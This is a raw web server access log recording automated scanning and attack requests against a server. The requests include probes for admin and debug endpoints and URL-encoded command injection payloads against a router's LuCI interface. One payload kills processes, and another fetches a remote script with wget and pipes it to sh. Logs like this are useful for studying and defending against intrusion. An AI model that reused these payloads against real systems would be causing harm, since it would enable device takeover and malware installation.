83.97.73.245 - - [24/Sep/2024:07:28:30 +0000] "GET /console/ HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:07:28:30 +0000] "GET /console/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 47 "http://5.161.235.50:80/console/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:07:34:40 +0000] "GET /_ignition/execute-solution HTTP/1.1" 302 8291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:07:34:40 +0000] "GET /_ignition/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 47 "http://5.161.235.50:80/_ignition/execute-solution" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.190.156.137 - - [24/Sep/2024:07:44:27 +0000] "GET / HTTP/1.0" 302 50426 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
83.97.73.245 - - [24/Sep/2024:07:47:48 +0000] "GET / HTTP/1.1" 302 8291 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:07:47:48 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
149.50.103.48 - - [24/Sep/2024:07:51:57 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
83.97.73.245 - - [24/Sep/2024:07:56:16 +0000] "GET / HTTP/1.1" 302 8292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:07:56:16 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.191.126.213 - - [24/Sep/2024:08:01:50 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
185.191.126.213 - - [24/Sep/2024:08:19:16 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
185.224.128.59 - - [24/Sep/2024:08:19:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 302 50509 "-" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:08:19:34 +0000] "GET /cgi-bin/luci/;stok=/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 27 "http://5.161.235.50:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:08:19:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 302 50509 "-" "Go-http-client/1.1"
185.224.128.59 - - [24/Sep/2024:08:19:34 +0000] "GET /cgi-bin/luci/;stok=/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 27 "http://5.161.235.50:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60" "Go-http-client/1.1"
83.97.73.245 - - [24/Sep/2024:08:39:54 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
